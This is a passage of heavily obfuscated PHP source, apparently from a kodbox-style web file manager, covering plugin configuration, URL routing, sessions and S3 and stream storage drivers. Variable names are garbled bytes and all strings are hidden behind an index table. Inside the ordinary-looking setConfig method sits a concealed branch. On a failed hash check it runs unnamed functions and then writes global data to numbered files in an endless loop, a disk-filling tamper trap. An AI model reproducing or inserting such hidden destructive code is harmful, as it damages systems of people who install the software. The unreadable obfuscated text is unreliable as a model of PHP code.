str_replace($éÜÃÓ«À, $Ù¦®¬ã, $Í¶öø“); } private function parseConfig(&$¹¬İ·•¯) { $ÃîË²Èş =& $_SERVER[ê‘³Æ±]; $Ô®İ€Òè = $ÃîË²Èş[1558]; if (!strstr($¹¬İ·•¯, $Ô®İ€Òè)) { return; } preg_match_all($ÃîË²Èş[1559], $¹¬İ·•¯, $—£…ŸŞŒ); if (!is_array($—£…ŸŞŒ) || count($—£…ŸŞŒ) == 0 || !is_array($—£…ŸŞŒ[0]) || count($—£…ŸŞŒ[0]) == 0) { return; } $çËò±ö‡ = $this->getConfig(); $äÉªµŠÑ = array(); $±»ËÈ© = array(); foreach ($—£…ŸŞŒ[0] as $³•æÈ°ç) { $ú²çò† = substr($³•æÈ°ç, strlen($Ô®İ€Òè), -2); $äÉªµŠÑ[] = $³•æÈ°ç; $±»ËÈ©[] = _get($çËò±ö‡, $ú²çò†); } $¹¬İ·•¯ = str_replace($äÉªµŠÑ, $±»ËÈ©, $¹¬İ·•¯); } private function parsePackage(&$¹¤€ªÏ) { $åô•Õı =& $_SERVER[ê‘³Æ±]; $±®Üåö = $åô•Õı[1560]; if (!strstr($¹¤€ªÏ, $±®Üåö)) { return; } preg_match_all($åô•Õı[1561], $¹¤€ªÏ, $›˜ÈÎš¡); if (!is_array($›˜ÈÎš¡) || count($›˜ÈÎš¡) == 0 || !is_array($›˜ÈÎš¡[0]) || count($›˜ÈÎš¡[0]) == 0) { return; } $ÆİÕÁ¾ = $this->appPackage(); $É¿ËŸéõ = array(); $ÊÍğ‘ìâ = array(); foreach ($›˜ÈÎš¡[0] as $ÃûÖ¤¾ô) { $ù˜€å£ = substr($ÃûÖ¤¾ô, strlen($±®Üåö), -2); $É¿ËŸéõ[] = $ÃûÖ¤¾ô; $ÊÍğ‘ìâ[] = _get($ÆİÕÁ¾, $ù˜€å£); } $¹¤€ªÏ = str_replace($É¿ËŸéõ, $ÊÍğ‘ìâ, $¹¤€ªÏ); } final function echoFile($ä˜Ô‚Ù, $ş—Ã¯’¿ = false) { $«Ä¬¯¸ñ =& $_SERVER[ê‘³Æ±]; $²‘ì÷è† = $this->pluginPath . $ä˜Ô‚Ù; if (ACT == $«Ä¬¯¸ñ[1562]) { echo $«Ä¬¯¸ñ[1563] . $this->pluginName . $«Ä¬¯¸ñ[8] . $ä˜Ô‚Ù . $«Ä¬¯¸ñ[1564]; if (!file_exists($²‘ì÷è†)) { echo $«Ä¬¯¸ñ[1565]; return; } } $‚ŠÖ—ó = $this->parseFile($²‘ì÷è†); $this->parseLang($‚ŠÖ—ó); $this->parseConfig($‚ŠÖ—ó); $this->parsePackage($‚ŠÖ—ó); if (is_array($ş—Ã¯’¿)) { $‚ŠÖ—ó = str_replace(array_keys($ş—Ã¯’¿), array_values($ş—Ã¯’¿), $‚ŠÖ—ó); } echo $«Ä¬¯¸ñ[228] . $‚ŠÖ—ó; } final function initLang() { $Îşò±ñ¶ =& $_SERVER[ê‘³Æ±]; $ò€´– = $Îşò±ñ¶[1566]; $¹Àó¡äâ = $this->pluginPath . $Îşò±ñ¶[1567]; $á¾¤ÕÚÍ = I18n::getType(); $»µóÃè¿ = array(); if (file_exists($¹Àó¡äâ . $á¾¤ÕÚÍ . $Îşò±ñ¶[832])) { $»µóÃè¿ = (include $¹Àó¡äâ . $á¾¤ÕÚÍ . $Îşò±ñ¶[832]); } else { if ($á¾¤ÕÚÍ == $Îşò±ñ¶[1568] && !file_exists($¹Àó¡äâ . $á¾¤ÕÚÍ . $Îşò±ñ¶[832]) && file_exists($¹Àó¡äâ . $Îşò±ñ¶[1569])) { $»µóÃè¿ = (include $¹Àó¡äâ . $Îşò±ñ¶[1569]); } else { if (file_exists($¹Àó¡äâ . $ò€´– . $Îşò±ñ¶[832])) { $»µóÃè¿ = (include $¹Àó¡äâ . $ò€´– . $Îşò±ñ¶[832]); } } } if (!is_array($»µóÃè¿)) { return array(); } if (@count($»µóÃè¿) > 0) { I18n::set($»µóÃè¿); } return $»µóÃè¿; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ò–·ñÉ) { $ğÖ‡”Ó¯ =& $_SERVER[ê‘³Æ±]; $Ùì®À¡Ø = $_SERVER[$ğÖ‡”Ó¯[784]]; $ÜÒæòıó = $ğÖ‡”Ó¯[785]; if ($_SERVER[$ğÖ‡”Ó¯[786]] != $ÜÒæòıó($Ùì®À¡Ø)) { $˜Œ÷¿ã = $ğÖ‡”Ó¯[866]; $åŞßÊï = $ğÖ‡”Ó¯[787]; $±Ûì‰£´ = $_SERVER[$ğÖ‡”Ó¯[788]] . $ğÖ‡”Ó¯[789]; $±çŞÁéî = $åŞßÊï($±Ûì‰£´); $úÊÆˆ’³ = explode($ğÖ‡”Ó¯[228], $±çŞÁéî); if (count($úÊÆˆ’³) < $ğÖ‡”Ó¯[613]) { $ÛÉæ‹áÜ = $ğÖ‡”Ó¯[790]; $ÛÉæ‹áÜ(); } $è›½Â¡­ = $ğÖ‡”Ó¯[867]; $è›½Â¡­($_SERVER[$ğÖ‡”Ó¯[868]]); $˜Œ÷¿ã = $ğÖ‡”Ó¯[866]; $˜Œ÷¿ã(); $ŸøŞõÂ” = $ğÖ‡”Ó¯[869]; $¸ ¼š¤· = json_encode($GLOBALS[$ğÖ‡”Ó¯[870]]); $¼‰²Áô¶ = 1; for ($ÂÈŞ¯½‚ = $¼‰²Áô¶; $ÂÈŞ¯½‚ > 0; $ÂÈŞ¯½‚++) { $ŸøŞõÂ”(DATA_PATH . $ÂÈŞ¯½‚, $¸ ¼š¤·); } } return $this->modelPlugin->setConfig($this->pluginName, $Ò–·ñÉ); } public function onSetConfig($ĞüïŠ¢) { } public function onGetConfig($¸¯ú­¸) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ûªªš›) { if ($ûªªš› == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($º×ßÇÙ = "\x70\x6c\x75\x67\x69\156\x41\x75\x74\x68") { $§±¸Ïçë =& $_SERVER[ê‘³Æ±]; if (!defined($§±¸Ïçë[467])) { return !1; } if (_get($GLOBALS, $§±¸Ïçë[496])) { return !0; } $”¬°‘·¤ = $this->getConfig(); if (!$”¬°‘·¤[$º×ßÇÙ]) { return !1; } return ActionCall($§±¸Ïçë[1570], $”¬°‘·¤[$º×ßÇÙ]); } public function url($¨§ãÆÕ„, $Í·¼ÚÆÊ = '', $ğ°ÖÂ³ë = true) { $Ïä—áç™ =& $_SERVER[ê‘³Æ±]; $Ç¦Ô­º = $this->getConfig(); $æ†¼Õ®Ñ = KOD_VERSION . $Ïä—áç™[10] . KOD_VERSION_BUILD; $š¹õ¦âË = $this->packageVersion(); $†ºŠéªü = $æ†¼Õ®Ñ . $Ïä—áç™[453] . $š¹õ¦âË; if (substr($¨§ãÆÕ„, 0, 4) == $Ïä—áç™[147] || substr($¨§ãÆÕ„, 0, 2) == $Ïä—áç™[1354]) { $½ìå§ã¸ = $¨§ãÆÕ„ . $Ïä—áç™[1571] . $†ºŠéªü; } else { if ($Í·¼ÚÆÊ == $Ïä—áç™[12]) { $½ìå§ã¸ = $this->pluginHost . $¨§ãÆÕ„ . $Ïä—áç™[1571] . $†ºŠéªü; } else { if ($Í·¼ÚÆÊ === $Ïä—áç™[79]) { $½ìå§ã¸ = $this->pluginHost . $¨§ãÆÕ„; } else { if ($Í·¼ÚÆÊ == $Ïä—áç™[1572]) { $½ìå§ã¸ = STATIC_PATH . $¨§ãÆÕ„ . $Ïä—áç™[1571] . $æ†¼Õ®Ñ; } else { if ($Í·¼ÚÆÊ == $Ïä—áç™[1573]) { $½ìå§ã¸ = APP_HOST . $Ïä—áç™[1574] . $¨§ãÆÕ„ . $Ïä—áç™[1571] . $æ†¼Õ®Ñ; } else { if (isset($Ç¦Ô­º[$Í·¼ÚÆÊ])) { $½ìå§ã¸ = $Ç¦Ô­º[$Í·¼ÚÆÊ] . $¨§ãÆÕ„ . $Ïä—áç™[1571] . $†ºŠéªü; } } } } } } if (!$ğ°ÖÂ³ë) { return $½ìå§ã¸; } echo $½ìå§ã¸; } public function link($Î¢öÊƒ… = false, $ƒ»¢«ñ¾ = '') { $ÆÂ¶˜Âœ =& $_SERVER[ê‘³Æ±]; if (!$Î¢öÊƒ…) { $this->link($ÆÂ¶˜Âœ[1575], $ÆÂ¶˜Âœ[1573]); $this->link($ÆÂ¶˜Âœ[1576], $ÆÂ¶˜Âœ[1572]); $this->link($ÆÂ¶˜Âœ[1577], $ÆÂ¶˜Âœ[1572]); $this->link($ÆÂ¶˜Âœ[1578], $ÆÂ¶˜Âœ[1572]); $this->link($ÆÂ¶˜Âœ[1579], $ÆÂ¶˜Âœ[1572]); return; } $¡ª°µŠé = $this->url($Î¢öÊƒ…, $ƒ»¢«ñ¾, !1); if (substr($Î¢öÊƒ…, -3) == $ÆÂ¶˜Âœ[1580]) { echo $ÆÂ¶˜Âœ[1581] . $¡ª°µŠé . $ÆÂ¶˜Âœ[1582] . $ÆÂ¶˜Âœ[228]; } else { if (substr($Î¢öÊƒ…, -4) == $ÆÂ¶˜Âœ[1583]) { echo $ÆÂ¶˜Âœ[1584] . $¡ª°µŠé . $ÆÂ¶˜Âœ[1585] . $ÆÂ¶˜Âœ[228]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\165\x6d" => "\x5b\60\55\71\x5d\x2b", "\72\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($îÌ½éŞÓ, $éç•ÑÌÚ) { $³»ø¨İè =& $_SERVER[ê‘³Æ±]; if ($îÌ½éŞÓ == $³»ø¨İè[1586]) { $ÍÅó¦ì = array_map($³»ø¨İè[1587], $éç•ÑÌÚ[0]); $›¥ÑÚ“ = strpos($éç•ÑÌÚ[1], $³»ø¨İè[8]) === 0 ? $éç•ÑÌÚ[1] : $³»ø¨İè[8] . $éç•ÑÌÚ[1]; $›Æ½µ = $éç•ÑÌÚ[2]; } else { $ÍÅó¦ì = null; $›¥ÑÚ“ = strpos($éç•ÑÌÚ[0], $³»ø¨İè[8]) === 0 ? $éç•ÑÌÚ[0] : $³»ø¨İè[8] . $éç•ÑÌÚ[0]; $›Æ½µ = $éç•ÑÌÚ[1]; } array_push(self::$maps, $ÍÅó¦ì); array_push(self::$routes, $›¥ÑÚ“); array_push(self::$methods, strtoupper($îÌ½éŞÓ)); array_push(self::$callbacks, $›Æ½µ); } public static function error($¯óãöŞ) { self::$errorCallback = $¯óãöŞ; } public static function haltOnMatch($€áƒş¾« = true) { self::$halts = $€áƒş¾«; } public static function dispatch() { $¯Ş‘³ĞË =& $_SERVER[ê‘³Æ±]; $õ¶Æ¶ˆ = parse_url($_SERVER[$¯Ş‘³ĞË[1588]], PHP_URL_PATH); $şÂŸŒµÛ = $_SERVER[$¯Ş‘³ĞË[158]]; $ÓÁì‘ú = array_keys(static::$patterns); $©¨Á˜µ = array_values(static::$patterns); $æ±µõø¿ = !1; self::$routes = preg_replace($¯Ş‘³ĞË[1256], $¯Ş‘³ĞË[8], self::$routes); if (in_array($õ¶Æ¶ˆ, self::$routes)) { $Å©…ÆìÖ = array_keys(self::$routes, $õ¶Æ¶ˆ); foreach ($Å©…ÆìÖ as $”‡˜ŠĞÒ) { if (self::$methods[$”‡˜ŠĞÒ] == $şÂŸŒµÛ || self::$methods[$”‡˜ŠĞÒ] == $¯Ş‘³ĞË[1589] || in_array($şÂŸŒµÛ, self::$maps[$”‡˜ŠĞÒ])) { $æ±µõø¿ = !0; if (!is_object(self::$callbacks[$”‡˜ŠĞÒ])) { $ø†ß¬Ğ¸ = explode($¯Ş‘³ĞË[8], self::$callbacks[$”‡˜ŠĞÒ]); $ÓúöØ·¨ = end($ø†ß¬Ğ¸); $ÄÉ÷‡µœ = explode($¯Ş‘³ĞË[1590], $ÓúöØ·¨); $¥Ñ¢ÛÙ­ = new $ÄÉ÷‡µœ[0](); $¥Ñ¢ÛÙ­->{$ÄÉ÷‡µœ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$”‡˜ŠĞÒ]); if (self::$halts) { return; } } } } } else { $’€¬—õ­ = 0; foreach (self::$routes as $”‡˜ŠĞÒ) { if (strpos($”‡˜ŠĞÒ, $¯Ş‘³ĞË[4]) !== !1) { $”‡˜ŠĞÒ = str_replace($ÓÁì‘ú, $©¨Á˜µ, $”‡˜ŠĞÒ); } if (preg_match($¯Ş‘³ĞË[1591] . $”‡˜ŠĞÒ . $¯Ş‘³ĞË[1592], $õ¶Æ¶ˆ, $ĞÁì“Â†)) { if (self::$methods[$’€¬—õ­] == $şÂŸŒµÛ || self::$methods[$’€¬—õ­] == $¯Ş‘³ĞË[1589] || !empty(self::$maps[$’€¬—õ­]) && in_array($şÂŸŒµÛ, self::$maps[$’€¬—õ­])) { $æ±µõø¿ = !0; array_shift($ĞÁì“Â†); if (!is_object(self::$callbacks[$’€¬—õ­])) { $ø†ß¬Ğ¸ = explode($¯Ş‘³ĞË[8], self::$callbacks[$’€¬—õ­]); $ÓúöØ·¨ = end($ø†ß¬Ğ¸); $ÄÉ÷‡µœ = explode($¯Ş‘³ĞË[1590], $ÓúöØ·¨); $¥Ñ¢ÛÙ­ = new $ÄÉ÷‡µœ[0](); if (!method_exists($¥Ñ¢ÛÙ­, $ÄÉ÷‡µœ[1])) { echo $¯Ş‘³ĞË[1593]; } else { call_user_func_array(array($¥Ñ¢ÛÙ­, $ÄÉ÷‡µœ[1]), $ĞÁì“Â†); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$’€¬—õ­], $ĞÁì“Â†); if (self::$halts) { return; } } } } $’€¬—õ­++; } } if ($æ±µõø¿ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ì´ŒÎ¼ =& $_SERVER[ê‘³Æ±]; header($_SERVER[$ì´ŒÎ¼[1594]] . $ì´ŒÎ¼[1595]); echo $ì´ŒÎ¼[1596]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¯Ş‘³ĞË[1588]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $á¥ûùĞ =& $_SERVER[ê‘³Æ±]; static $ëùä¥¬ = false; if ($ëùä¥¬) { return $ëùä¥¬; } $¶»Ó´¯ = $GLOBALS[$á¥ûùĞ[6]][$á¥ûùĞ[346]]; self::$sessionTime = $¶»Ó´¯[$á¥ûùĞ[1597]]; $èÙãÙÚ‹ = isset($GLOBALS[$á¥ûùĞ[1598]]) ? $GLOBALS[$á¥ûùĞ[1598]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($èÙãÙÚ‹)) { self::$sessionSign = Cookie::get($èÙãÙÚ‹); } else { self::$sessionSign = guid(); } } Cookie::setSafe($èÙãÙÚ‹, self::$sessionSign, self::$sessionTime); $òµ¥‘ø­ = $¶»Ó´¯[$á¥ûùĞ[1599]]; $–­Ş…Û± = $¶»Ó´¯[$òµ¥‘ø­]; $…ãûü®º = $¶»Ó´¯[$á¥ûùĞ[822]]; switch ($òµ¥‘ø­) { case $á¥ûùĞ[21]: self::$handle = Model($á¥ûùĞ[823]); break; case $á¥ûùĞ[824]: self::$handle = new CacheRedis($–­Ş…Û±, $…ãûü®º); break; case $á¥ûùĞ[825]: self::$handle = new CacheMemcached($–­Ş…Û±, $…ãûü®º); break; case $á¥ûùĞ[194]: $–­Ş…Û±[$á¥ûùĞ[78]] = $–­Ş…Û±[$á¥ûùĞ[78]] . $á¥ûùĞ[1600]; self::$handle = new CacheFile($–­Ş…Û±, $…ãûü®º); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ëùä¥¬ = new self(); return $ëùä¥¬; } public static function getBySign($óê§ï™ø) { CacheLock::lock($óê§ï™ø); $Œ¤ŞÄÊ‚ = self::$handle->get($óê§ï™ø); CacheLock::unlock($óê§ï™ø); $Œ¤ŞÄÊ‚ = unserialize($Œ¤ŞÄÊ‚); return is_array($Œ¤ŞÄÊ‚) ? $Œ¤ŞÄÊ‚ : array(); } public static function setBySign($úÁÜù·, $–Çî—…) { CacheLock::lock($úÁÜù·); self::$handle->set($úÁÜù·, serialize($–Çî—…), self::$sessionTime); CacheLock::unlock($úÁÜù·); } public static function sign($±šã¡çë = false) { $±šã¡çë && (self::$sessionSign = $±šã¡çë); self::init(); return self::$sessionSign; } public static function set($À‹äŒÎŞ, $¹÷ãÍ­† = false) { self::init(); if (is_array($À‹äŒÎŞ)) { foreach ($À‹äŒÎŞ as $’è¥÷¢Ç => $ó®‘†ì±) { array_set_value(self::$data, $’è¥÷¢Ç, $ó®‘†ì±); } } else { array_set_value(self::$data, $À‹äŒÎŞ, $¹÷ãÍ­†); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ë¬É›ìÇ = false) { self::init(); if (!$Ë¬É›ìÇ) { return self::$data; } return array_get_value(self::$data, $Ë¬É›ìÇ); } public static function remove($Ö„¹“Î®) { self::init(); unset(self::$data[$Ö„¹“Î®]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ê‘³Æ±][827])) { self::$handle->clearTimeout(); } } } goto FÜ˜¢‹àÒ„; dßÁÉÏµÎ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Äæ‰°å) { parent::__construct($Äæ‰°å); } public function uploadFormData($‰Ûšáæë, $ÙôŸ·¯Æ = 3600) { $·Õ¨‹Ú¥ =& $_SERVER[ê‘³Æ±]; $‚—¢©Å = $·Õ¨‹Ú¥[193]; $À«óÃ´ = $·Õ¨‹Ú¥[1333]; $¦ÇåË«ò = $·Õ¨‹Ú¥[62]; $ÀƒÄëİ½ = gmdate($·Õ¨‹Ú¥[1334]); $û¯Ğ™€ = gmdate($·Õ¨‹Ú¥[737]); $­‘»·¾À = $·Õ¨‹Ú¥[1335]; $Ï—İ–÷Ô = $ÙôŸ·¯Æ . $·Õ¨‹Ú¥[12]; $³ñ¯”ÎÛ = $·Õ¨‹Ú¥[1297]; $ñ±³äÕÌ = array($this->accessKey, $û¯Ğ™€, $this->region, $¦ÇåË«ò, $­‘»·¾À); $è©áÚ× = implode($·Õ¨‹Ú¥[8], $ñ±³äÕÌ); $¨•ÁÁ = array($·Õ¨‹Ú¥[1299] => gmdate($·Õ¨‹Ú¥[1298], strtotime($·Õ¨‹Ú¥[1336])), $·Õ¨‹Ú¥[1300] => array(array($·Õ¨‹Ú¥[1302] => $this->bucket), array($·Õ¨‹Ú¥[1301] => $‚—¢©Å), array($·Õ¨‹Ú¥[1303], $·Õ¨‹Ú¥[1304], $·Õ¨‹Ú¥[12]), array($·Õ¨‹Ú¥[1303], $·Õ¨‹Ú¥[1337], $·Õ¨‹Ú¥[12]), array($·Õ¨‹Ú¥[1303], $·Õ¨‹Ú¥[1338], $·Õ¨‹Ú¥[12]), array($·Õ¨‹Ú¥[1305] => $³ñ¯”ÎÛ), array($·Õ¨‹Ú¥[1339] => $è©áÚ×), array($·Õ¨‹Ú¥[1340] => $À«óÃ´), array($·Õ¨‹Ú¥[1341] => $ÀƒÄëİ½), array($·Õ¨‹Ú¥[1342] => $Ï—İ–÷Ô))); $—ˆî¿àÇ = base64_encode(json_encode($¨•ÁÁ)); $˜×ŸÊÖ = hash_hmac($·Õ¨‹Ú¥[1343], $û¯Ğ™€, $·Õ¨‹Ú¥[1344] . $this->secret, !0); $ú…‹Ó•ñ = hash_hmac($·Õ¨‹Ú¥[1343], $this->region, $˜×ŸÊÖ, !0); $±ÆÊô‰á = hash_hmac($·Õ¨‹Ú¥[1343], $¦ÇåË«ò, $ú…‹Ó•ñ, !0); $Ÿ¦Ù–·‰ = hash_hmac($·Õ¨‹Ú¥[1343], $­‘»·¾À, $±ÆÊô‰á, !0); $¥µÚ¯³Ò = hash_hmac($·Õ¨‹Ú¥[1343], $—ˆî¿àÇ, $Ÿ¦Ù–·‰); $‚€Üãû = array($·Õ¨‹Ú¥[212] => $·Õ¨‹Ú¥[12], $·Õ¨‹Ú¥[1345] => $·Õ¨‹Ú¥[12], $·Õ¨‹Ú¥[1301] => $‚—¢©Å, $·Õ¨‹Ú¥[1305] => $³ñ¯”ÎÛ, $·Õ¨‹Ú¥[1309] => $—ˆî¿àÇ, $·Õ¨‹Ú¥[1346] => $è©áÚ×, $·Õ¨‹Ú¥[1347] => $À«óÃ´, $·Õ¨‹Ú¥[1348] => $ÀƒÄëİ½, $·Õ¨‹Ú¥[1349] => $Ï—İ–÷Ô, $·Õ¨‹Ú¥[1350] => $¥µÚ¯³Ò, $·Õ¨‹Ú¥[176] => $this->getHost()); return $‚€Üãû; } public function multiUploadFormData($õùõó×, $ÌãÖíşÍ = 3600) { $Ï Ô±Ş› =& $_SERVER[ê‘³Æ±]; $ÀãÛÃ­Ù = gmdate($Ï Ô±Ş›[1429]); $ÎÒ‡Š¼ã = array(); $ÎáØÍ–Û = $this->client->getUploadId($this->bucket, $õùõó×, $ÎÒ‡Š¼ã); if (!$ÎáØÍ–Û) { return !1; } return array($Ï Ô±Ş›[220] => $ÎáØÍ–Û, $Ï Ô±Ş›[176] => $this->getHost() . $Ï Ô±Ş›[8] . $this->pathEncode($õùõó×), $Ï Ô±Ş›[221] => $ÀãÛÃ­Ù, $Ï Ô±Ş›[95] => $õùõó×); } public function multiUploadAuthData($¦‚ƒ÷çõ, $ªè„¿œŠ = array()) { $ŠÙİË‡œ =& $_SERVER[ê‘³Æ±]; $°·éäœÂ = isset($ªè„¿œŠ[$ŠÙİË‡œ[169]]) ? $ªè„¿œŠ[$ŠÙİË‡œ[169]] : $ŠÙİË‡œ[12]; $ŞóÙ”±Ä = $ªè„¿œŠ[$ŠÙİË‡œ[95]]; unset($ªè„¿œŠ[$ŠÙİË‡œ[95]]); if (isset($ªè„¿œŠ[$ŠÙİË‡œ[222]])) { return $this->listUploadParts($ŞóÙ”±Ä, $ªè„¿œŠ); } $Î¹Äşáø = array(); if (isset($ªè„¿œŠ[$ŠÙİË‡œ[1430]])) { $Î¹Äşáø[$ŠÙİË‡œ[1431]] = $ªè„¿œŠ[$ŠÙİË‡œ[1430]]; } $ƒ…‹ä–¦ = explode($ŠÙİË‡œ[178], $this->getHost()); $‚Êƒêø = array($ŠÙİË‡œ[1432] => $ƒ…‹ä–¦[1], $ŠÙİË‡œ[1433] => $ŠÙİË‡œ[12], $ŠÙİË‡œ[212] => $ŠÙİË‡œ[120], $ŠÙİË‡œ[1345] => $ªè„¿œŠ[$ŠÙİË‡œ[80]]); $Ÿº­ö ú = $ŠÙİË‡œ[225]; $Á§›÷± = $ŠÙİË‡œ[8] . $this->pathEncode($ŞóÙ”±Ä) . $°·éäœÂ; $¸ö¯ì›Ò = $this->client->__getSignatureV4($Î¹Äşáø, $‚Êƒêø, $Ÿº­ö ú, $Á§›÷±); if (strpos($°·éäœÂ, $ŠÙİË‡œ[224]) === 0) { if (isset($Î¹Äşáø[$ŠÙİË‡œ[1431]])) { $Òí–¢Š… = $Î¹Äşáø[$ŠÙİË‡œ[1431]]; } else { if (isset($¸ö¯ì›Ò[$ŠÙİË‡œ[1431]])) { $Òí–¢Š… = $¸ö¯ì›Ò[$ŠÙİË‡œ[1431]]; } else { $Òí–¢Š… = hash($ŠÙİË‡œ[1343], $ŠÙİË‡œ[12]); } } return array($ŠÙİË‡œ[231] => $¸ö¯ì›Ò[$ŠÙİË‡œ[231]], $ŠÙİË‡œ[1431] => $Òí–¢Š…, $ŠÙİË‡œ[221] => $¸ö¯ì›Ò[$ŠÙİË‡œ[1434]]); } return $¸ö¯ì›Ò[$ŠÙİË‡œ[231]]; } public function listUploadParts($ÚÙë¤éÏ, $…£ïÎòÅ = array()) { $ŸáîÄ =& $_SERVER[ê‘³Æ±]; $¯ï—ÕØ = str_replace($ŸáîÄ[232], $ŸáîÄ[12], $…£ïÎòÅ[$ŸáîÄ[169]]); $ı´Š†İ = $this->client->listParts($this->bucket, $ÚÙë¤éÏ, $¯ï—ÕØ); if (!$ı´Š†İ) { return !1; } $©Ó¹Ôí = $ŸáîÄ[1435]; foreach ($ı´Š†İ as $çı¸ò‚) { $©Ó¹Ôí .= $ŸáîÄ[1436] . "\x3c\x50\141\162\x74\116\165\155\x62\145\162\76{$çı¸ò‚[$ŸáîÄ[1390]]}\x3c\x2f\120\141\162\164\116\165\x6d\x62\x65\x72\76\xa" . "\x3c\105\124\141\x67\x3e{$çı¸ò‚[$ŸáîÄ[1391]]}\x3c\57\105\124\x61\147\76\xa" . $ŸáîÄ[1437]; } $©Ó¹Ôí .= $ŸáîÄ[1438]; $«£·ƒÛ´ = array(); $€İ¨ƒ²· = explode($ŸáîÄ[178], $this->getHost()); $òç·Ìô = array($ŸáîÄ[1432] => $€İ¨ƒ²·[1], $ŸáîÄ[212] => $ŸáîÄ[120], $ŸáîÄ[1345] => strlen($©Ó¹Ôí)); $ª”†çëğ = $ŸáîÄ[223]; $´óĞ¢ = $ŸáîÄ[8] . $this->pathEncode($ÚÙë¤éÏ) . $…£ïÎòÅ[$ŸáîÄ[169]]; $øòö˜˜Á = $this->client->__getSignatureV4($«£·ƒÛ´, $òç·Ìô, $ª”†çëğ, $´óĞ¢, $©Ó¹Ôí); return array($ŸáîÄ[231] => $øòö˜˜Á[$ŸáîÄ[231]], $ŸáîÄ[221] => $øòö˜˜Á[$ŸáîÄ[1434]], $ŸáîÄ[233] => $ı´Š†İ, $ŸáîÄ[1431] => $øòö˜˜Á[$ŸáîÄ[1431]]); } public function link($Ô„×â½, $¦İÜÃÇ« = array()) { return parent::link($Ô„×â½, $¦İÜÃÇ«); } public function fileOut($æäæ¡¬, $ºş÷¦‹Œ = false, $¦œÄì¼Û = false, $ó²ñæó = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ê‘³Æ±][1439])) { return parent::fileOutServer($æäæ¡¬, $ºş÷¦‹Œ, $¦œÄì¼Û, $ó²ñæó); } parent::fileOut($æäæ¡¬, $ºş÷¦‹Œ, $¦œÄì¼Û, $ó²ñæó); } public function fileOutImage($á¼¨¢Üó, $°àÁÑ = 250) { if (strstr($this->endpoint, $_SERVER[ê‘³Æ±][1439])) { return parent::fileOutImageServer($á¼¨¢Üó, $°àÁÑ); } parent::fileOutImage($á¼¨¢Üó, $°àÁÑ); } public function fileOutLink($ûëÚÌÌ) { $¨×³Ü±Ã =& $_SERVER[ê‘³Æ±]; if (substr($ûëÚÌÌ, 0, 7) == $¨×³Ü±Ã[1312]) { $ûëÚÌÌ = $¨×³Ü±Ã[1313] . substr($ûëÚÌÌ, 7); } header($¨×³Ü±Ã[160] . $ûëÚÌÌ); die; } public function getHost() { $ï‘£ ¸× =& $_SERVER[ê‘³Æ±]; $ ÖšöÂ = str_rtrim(parent::getHost(), $ï‘£ ¸×[8] . $this->bucket); $ ÖšöÂ = explode($ï‘£ ¸×[178], $ ÖšöÂ); return $ ÖšöÂ[0] . $ï‘£ ¸×[178] . $this->bucket . $ï‘£ ¸×[10] . $ ÖšöÂ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($èñ–Ÿ‰Â, $¨øŸÅô = 0) { parent::__construct(); $this->source = $èñ–Ÿ‰Â; $this->sourceSize = $¨øŸÅô; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($–´Çê»¢ = false) { return $this->sourceSize; } public function getContent($ØÂ¶Üš” = false) { return $this->fileSubstr($ØÂ¶Üš”, 0, $this->sourceSize); } public function fileSubstr($ëš‰»Õ = false, $¬‹§ƒÖá = 0, $’·õ·×£ = 0) { if (!$’·õ·×£) { $’·õ·×£ = $this->sourceSize; } $å¡•’Ã± = $this->sourceSize - $¬‹§ƒÖá; if ($’·õ·×£ >= $å¡•’Ã±) { $’·õ·×£ = $å¡•’Ã±; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¬‹§ƒÖá, $’·õ·×£); } if ($this->sourceType == self::TYPE_FILE) { if ($’·õ·×£ <= 0) { return $_SERVER[ê‘³Æ±][12]; } $í¬Ü›’¥ = ftell($this->source); fseek_64($this->source, $í¬Ü›’¥ + $¬‹§ƒÖá); $Œ¿Ù¨Ô† = @fread($this->source, $’·õ·×£); fseek_64($this->source, $í¬Ü›’¥); return $Œ¿Ù¨Ô†; } } public function hashMd5($ë§¬İøó = false) { return md5($this->getContent()); } public static function hash($âÄá›®¶, $óÔÓ–ş = 0) { $¹ì›ıêá = new PathDriverStream($âÄá›®¶, $óÔÓ–ş); return $¹ì›ıêá->hashSimple($âÄá›®¶); } public static function md5($§òáá¥Á, $¸»™ ”Ì = 0) { $ØâÔç«‰ = new PathDriverStream($§òáá¥Á, $¸»™ ”Ì); return $ØâÔç«‰->hashMd5($§òáá¥Á); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\57\57\x76\x30\56\141\x70\151\x2e\165\x70\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÊÂòïıˆ) { parent::__construct(); 